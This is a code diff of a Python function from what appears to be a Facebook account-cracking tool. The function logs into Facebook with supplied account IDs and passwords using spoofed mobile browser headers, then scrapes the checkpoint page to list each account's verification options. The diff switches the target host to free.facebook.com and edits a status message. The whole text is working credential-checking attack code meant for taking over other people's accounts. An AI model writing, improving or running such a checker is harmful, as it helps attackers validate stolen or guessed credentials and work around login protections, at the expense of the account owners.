@@ -573,22 +573,22 @@ def metod2(idf,pwv):
 def ceker(idf,pw):
 	global cp
 	ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
-	head = {"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+	head = {"Host": "free.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 	ses = requests.Session()
 	try:
-		hi = ses.get('https://m.facebook.com')
-		ho = sop(ses.post('https://m.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
+		hi = ses.get('https://free.facebook.com')
+		ho = sop(ses.post('https://free.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
 		jo = ho.find('form')
 		data = {}
 		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
 		for anj in jo('input'):
 			if anj.get('name') in lion:
 				data.update({anj.get('name'):anj.get('value')})
-		kent = sop(ses.post('https://m.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
+		kent = sop(ses.post('https://free.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
 		opsi = kent.find_all('option')
 		if len(opsi)==0:
 			tree = Tree("")
-			tree.add(f"{hijo}Tapyes / A2f ( cek di mbasic ){x}")
+			tree.add(f"{hijo}Tapyes / A2f (🥳){x}")
 			prints(tree)
 		else:
 			for opsii in opsi:
